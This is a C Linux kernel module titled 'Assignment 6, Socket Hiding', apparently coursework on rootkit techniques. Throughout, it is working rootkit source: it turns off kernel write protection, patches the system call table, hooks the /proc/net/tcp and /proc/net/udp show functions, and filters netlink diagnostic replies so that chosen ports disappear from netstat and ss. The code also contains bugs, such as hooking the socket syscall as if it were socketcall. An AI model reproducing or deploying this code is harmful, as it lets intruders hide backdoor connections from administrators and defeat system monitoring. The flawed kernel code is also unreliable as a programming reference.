/*
 *  Assignment 6
 *  Socket Hiding
 *
 *  Requirements:
 *     a) Hide sockets from user land tools
 */


#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/unistd.h>
#include <linux/mm_types.h>
#include <linux/types.h>
#include <asm/uaccess.h>
#include <linux/dirent.h>
#include <linux/sched.h>
#include <linux/proc_fs.h>
#include <linux/namei.h>
#include <linux/seq_file.h>
#include <linux/inet_diag.h>
#include <linux/profile.h>
#include <net/tcp.h>
#include <net/udp.h>
#include <net/inet_sock.h>

#include "sysmap.h"
/* #include "proc_internal.h" */

#define MAX_HIDE_PORTS 99
#define SOCKET_STATE_VISIBLE 0
#define SOCKET_STATE_HIDDEN 1
#define syscalls ((void**)SM_sys_call_table)

void disable_ro(void)
{
    write_cr0(read_cr0() & ~X86_CR0_WP);
    barrier();
}

void enable_ro(void)
{
    write_cr0(read_cr0() | X86_CR0_WP);
    barrier();
}



int socket_hiding_state = SOCKET_STATE_VISIBLE;

int (*real_tcp4_seq_show)(struct seq_file*, void*);
int (*real_udp4_seq_show)(struct seq_file*, void*);
asmlinkage long (*real_socketcall)(int, unsigned long*);
int (*real_packet_rcv)( struct sk_buff*,
                        struct net_device*,
                        struct packet_type*,
                        struct net_device* );

void** tcp_hook_fn_ptr;
void** udp_hook_fn_ptr;

/* TCP/UDP ports to hide */
short tcp_port_to_hide[MAX_HIDE_PORTS];
short udp_port_to_hide[MAX_HIDE_PORTS];
int num_tcp_port_to_hide = 0;
int num_udp_port_to_hide = 0;

void parse_socket_port(char* str_port)
{
    char* str_port_no = str_port + 1;
    short port_no;

    // Make sure the string is long enough
    if (strlen(str_port) < 2) {
        return;
    }

    // Extract the port number
    if (sscanf(str_port_no, "%hd", &port_no) <= 0) {
        return;
    }

    // Parse the prefix
    switch (*str_port) {
        case 't':
        case 'T':
            // printk(KERN_INFO "TCP port: %hd\n", port_no);
            tcp_port_to_hide[num_tcp_port_to_hide++] = port_no;
            break;
        case 'u':
        case 'U':
            // printk(KERN_INFO "UDP port: %hd\n", port_no);
            udp_port_to_hide[num_udp_port_to_hide++] = port_no;
            break;
        case 'a':
        case 'A':
            // printk(KERN_INFO "TCP/UDP port: %hd\n", port_no);
            tcp_port_to_hide[num_tcp_port_to_hide++] = port_no;
            udp_port_to_hide[num_udp_port_to_hide++] = port_no;
            break;
        default:
            break;
    }
    return;
}

void set_socket_ports(char* ports)
{
    char *c = ports;
    char *pos = strstr(c, ",");

    // Reset the lists
    num_tcp_port_to_hide = 0;
    num_udp_port_to_hide = 0;

    // Split ports by commas and parse them
    while(pos != NULL) {
        *pos = '\0';
        parse_socket_port(c);

        c = pos + 1;
        pos = strstr(c, ",");
    }
    parse_socket_port(c);
}

inline int check_port_in_list(short port, short* list, int size)
{
    int i;
    for (i = 0; i < size; i++) {
        if (list[i] == port) {
            return 1;
        }
    }
    return 0;
}

inline int hide_tcp_port(short port)
{
    // Convert port to host format
    return check_port_in_list(ntohs(port), tcp_port_to_hide, num_tcp_port_to_hide);
}

inline int hide_udp_port(short port)
{
    // Convert port to host format
    return check_port_in_list(ntohs(port), udp_port_to_hide, num_udp_port_to_hide);
}

/*
 * Hooked show function of the TCP seq file
 */
int fake_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct tcp_iter_state* st;
    struct inet_sock* isk;
    struct inet_request_sock* ireq;
    /* struct inet_timewait_sock* itw; */

    if (v == SEQ_START_TOKEN) {
        return real_tcp4_seq_show(seq, v);
    }

    st = seq->private;

    switch (st->state) {
        case TCP_SEQ_STATE_LISTENING:
        case TCP_SEQ_STATE_ESTABLISHED:
            isk = inet_sk(v);
            if (hide_tcp_port(isk->inet_sport) || hide_tcp_port(isk->inet_dport)) {
                return 0;
            }
            break;
        case TCP_SEQ_STATE_OPENREQ:
            ireq = inet_rsk(v);
            if (hide_tcp_port(ireq->ir_loc_addr) || hide_tcp_port(ireq->ir_rmt_addr)) {
                return 0;
            }
        default:
            break;
    }
    return real_tcp4_seq_show(seq, v);
}

/*
 * Hooked show function of the UDP seq file
 */
int fake_udp4_seq_show(struct seq_file *seq, void *v)
{
    struct inet_sock* isk;

    if (v == SEQ_START_TOKEN) {
        return real_udp4_seq_show(seq, v);
    }

    isk = inet_sk(v);
    if (hide_udp_port(isk->inet_sport) || hide_udp_port(isk->inet_dport)) {
        return 0;
    }
    return real_udp4_seq_show(seq, v);
}

struct proc_dir_entry* get_pde_subdir(struct proc_dir_entry* pde, const char* name)
{
    struct proc_dir_entry* result = pde->subdir;
    while(result && strcmp(name, result->name)) {
        result = result->next;
    }
    return result;
}

asmlinkage long fake_recvmsg(int fd, struct msghdr __user *umsg, unsigned flags)
{
    // Call the real function
    long ret = SM_sys_recvmsg(fd, umsg, flags);

    // Check if the file is really a socket and get it
    int err = 0;
    struct socket *s = sockfd_lookup(fd, &err);
    struct sock *sk = s->sk;

    // Check if the socket is used for the inet_diag protocol
    if (!err && sk->sk_family == AF_NETLINK && sk->sk_protocol == NETLINK_INET_DIAG) {

        // Check if it is a process called "ss" (optional ;))
        /*if (strcmp(current->comm, "ss") == 0) {*/
        long remain = ret;

        // Copy data from user space to kernel space
        struct msghdr* msg = kmalloc(ret, GFP_KERNEL);
        int err = copy_from_user(msg, umsg, ret);
        struct nlmsghdr* hdr = msg->msg_iov->iov_base;
        if (err) {
            return ret; // panic
        }

        // Iterate the entries
        do {
            struct inet_diag_msg* r = NLMSG_DATA(hdr);

            // We only have to consider TCP ports here because ss fetches
            // UDP information from /proc/udp which we already handle
            if (hide_tcp_port(r->id.idiag_sport) || hide_tcp_port(r->id.idiag_dport)) {
                // Hide the entry by coping the remaining entries over it
                long new_remain = remain;
                struct nlmsghdr* next_entry = NLMSG_NEXT(hdr, new_remain);
                memmove(hdr, next_entry, new_remain);

                // Adjust the length variables
                ret -= (remain - new_remain);
                remain = new_remain;
            } else {
                // Nothing to do -> skip this entry
                hdr = NLMSG_NEXT(hdr, remain);
            }
        } while (remain > 0);

        // Copy data back to user space
        err = copy_to_user(umsg, msg, ret);
        kfree(msg);
        if (err) {
            return ret; // panic
        }
        /*}*/
    }
    return ret;
}

asmlinkage long fake_socketcall(int call, unsigned long __user *args)
{
    switch (call) {
        case SYS_RECVMSG:
            return fake_recvmsg(args[0], (struct msghdr __user *)args[1], args[2]);
        default:
            return real_socketcall(call, args);
    }
}


int init_module(void){
    struct kobject* mod_kobj = &(((struct module *)(THIS_MODULE))->mkobj).kobj;

    printk(KERN_INFO "Socket Hiding loaded.\n");
    struct net* net_ns;

    if (socket_hiding_state == SOCKET_STATE_HIDDEN) {
        return 0;
    }

    // Iterate all net namespaces
    list_for_each_entry(net_ns, &net_namespace_list, list) {

        // Get the corresponding proc entries
        struct proc_dir_entry* pde_net = net_ns->proc_net;
        struct proc_dir_entry* pde_tcp = get_pde_subdir(pde_net, "tcp");
        struct proc_dir_entry* pde_udp = get_pde_subdir(pde_net, "udp");
        struct tcp_seq_afinfo* tcp_info = pde_tcp->data;
        struct udp_seq_afinfo* udp_info = pde_udp->data;

        // Save and hook the TCP show function
        tcp_hook_fn_ptr = (void**) &tcp_info->seq_ops.show;
        real_tcp4_seq_show = *tcp_hook_fn_ptr;
        *tcp_hook_fn_ptr = fake_tcp4_seq_show;

        // Save and hook the UDP show function
        udp_hook_fn_ptr = (void**) &udp_info->seq_ops.show;
        real_udp4_seq_show = *udp_hook_fn_ptr;
        *udp_hook_fn_ptr = fake_udp4_seq_show;
    }

    disable_ro();
    real_socketcall = syscalls[__NR_socket];
    syscalls[__NR_socket] = fake_socketcall;
    enable_ro();

    socket_hiding_state = SOCKET_STATE_HIDDEN;

    return 0;
}

void cleanup_module(void){
    printk(KERN_INFO "Socket Hiding unloaded.\n");
    if (socket_hiding_state == SOCKET_STATE_VISIBLE) {
        return;
    }
    // Restore the hooked funtions
    *tcp_hook_fn_ptr = real_tcp4_seq_show;
    *udp_hook_fn_ptr = real_udp4_seq_show;

    disable_ro();
    syscalls[__NR_socket] = real_socketcall;
    enable_ro();

    socket_hiding_state = SOCKET_STATE_VISIBLE;

    return;
}

